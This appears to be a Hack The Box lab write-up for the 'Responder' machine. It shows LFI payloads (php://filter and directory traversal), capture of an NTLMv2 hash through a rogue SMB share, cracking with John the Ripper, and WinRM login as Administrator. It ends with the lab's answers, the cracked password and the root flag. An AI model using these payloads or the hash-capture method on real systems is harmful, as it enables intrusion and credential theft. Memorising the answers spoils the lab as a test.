---
layout: single
title: Responder - Hack The Box
excerpt: "In this machine, we exploit LLMNR/NBT-NS poisoning to capture NTLMv2 hashes and crack them."
date: 2025-03-11
classes: wide
header:
  teaser: /img2/responder.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Very Easy
tags:
  - LLMNR/NBT-NS poisoning
  - NTLMv2s
---

![](/img2/Pasted%20image%2020250311104959.png)

## Introduction

> In this machine, we exploit LLMNR/NBT-NS poisoning to capture NTLMv2 hashes and crack them.

## Reconnaissance

- Connectivity

```bash
ping -c1 10.129.208.162
```

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.208.162
```

![](/img2/Pasted%20image%2020250311105508.png)

- Add domain to /etc/hosts

```bash
echo "10.129.208.162 unika.htb" >> /etc/hosts
```

- See the machine technologies 

```bash
whatweb unika.htb
```

![](/img2/Pasted%20image%2020250311105948.png)

- Check source code of index page

![](/img2/Pasted%20image%2020250311112945.png)

> We found a possible LFI

- (BONUS) Try to view the backend code of index.php

- Send response to index.php

```bash
curl http://unika.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php > index.php
```

- Decode index.php 

```bash
cat index.php | base64 -d
```

![](/img2/Pasted%20image%2020250311113625.png)

> If "page" is not in the url show the english.html, else allow the user to choose the file to show.

## Exploitation

- Test LFI

```bash
curl http://unika.htb/index.php?page=../../../../windows/win.ini
```

![](/img2/Pasted%20image%2020250311114816.png)

- Get NTLM Hash with wireshark

- Create SMB service in the host and upload test file

```bash
apt install samba
```

```bash
mkdir /usr/share/samba/publico
```

```bash
echo "TEST" > /usr/share/samba/publico/test.txt
```

![](/img2/Pasted%20image%2020250311141417.png)

```bash
systemctl restart smbd
```

- Intercept the request to own SMB service with wireshark

![](/img2/Pasted%20image%2020250311141559.png)

- Copy values to create the HASH

```
User:
Domain:
Challenge:
HMAC-MD5: 
NTLMv2Response without HMAC: 
```

- User and domain:

![](/img2/Pasted%20image%2020250311141928.png)

```
User: Administrator
Domain: RESPONDER
Challenge:
HMAC-MD5: 
NTLMv2Response without HMAC: 
```

- Challenge:

![](/img2/Pasted%20image%2020250311142116.png)

```
User: Administrator
Domain: RESPONDER
Challenge: 583a9235488cccb1
HMAC-MD5: 
NTLMv2Response without HMAC: 
```

- HMAC-MD5:

![](/img2/Pasted%20image%2020250311142320.png)

```
User: Administrator
Domain: RESPONDER
Challenge: 583a9235488cccb1
HMAC-MD5: fdaa6c84ae9d9f9c07fe6209c9bcacfc
NTLMv2Response without HMAC-MD5: 
```

- NTLMv2Response without HMAC-MD5: 

![](/img2/Pasted%20image%2020250311142457.png)

```
User: Administrator
Domain: RESPONDER
Challenge: 583a9235488cccb1
HMAC-MD5: fdaa6c84ae9d9f9c07fe6209c9bcacfc
NTLMv2Response without HMAC-MD5: 01010000000000006ae580018292db0181e8493b0080dafc0000000002000c0050005900550053004500520001000c0050005900550053004500520004000c0070007900750073006500720003001a007000790075007300650072002e00700079007500730065007200070008006ae580018292db0106000400020000000800300030000000000000000100000000200000686b285cdf2e3909b8b49869d0cc97afddfa35b723d2b709fdba9258165ba3f10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330037000000000000000000
```

- Create HASH

```
User::Domain:Challenge:HMAC-MD5:NTLMv2Response without HMAC-MD5
```

```bash
echo "Administrator::RESPONDER:583a9235488cccb1:fdaa6c84ae9d9f9c07fe6209c9bcacfc:01010000000000006ae580018292db0181e8493b0080dafc0000000002000c0050005900550053004500520001000c0050005900550053004500520004000c0070007900750073006500720003001a007000790075007300650072002e00700079007500730065007200070008006ae580018292db0106000400020000000800300030000000000000000100000000200000686b285cdf2e3909b8b49869d0cc97afddfa35b723d2b709fdba9258165ba3f10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330037000000000000000000" > hash.txt
```

- Craking the HASH with John The Ripper

```bash
john -w=wordlists.txt hash.txt
```

![](/img2/Pasted%20image%2020250311143658.png)

- Connect to WinRM

```bash
evil-winrm -i 10.129.208.162 -u administrator -p badminton
```

![](/img2/Pasted%20image%2020250311144043.png)

## Tasks

1. When visiting the web service using the IP address, what is the domain that we are being redirected to?
> unika.htb

2. Which scripting language is being used on the server to generate webpages?
> php

3. What is the name of the URL parameter which is used to load different language versions of the webpage?
> page

4. Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
> ../../../../../../../../windows/system32/drivers/etc/hosts

5. Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
> //10.10.14.6/somefile

6. What does NTLM stand for?
> New Technology LAN Manager

7. Which flag do we use in the Responder utility to specify the network interface?
> -I

8. There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
> Jonh The Ripper

9. What is the password for the administrator user?
> badminton

10. We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
> 5985

11. Submit root flag
> ea81b7afddd03efaa0945333ed147fac

![](/img2/Pasted%20image%2020250311144630.png)
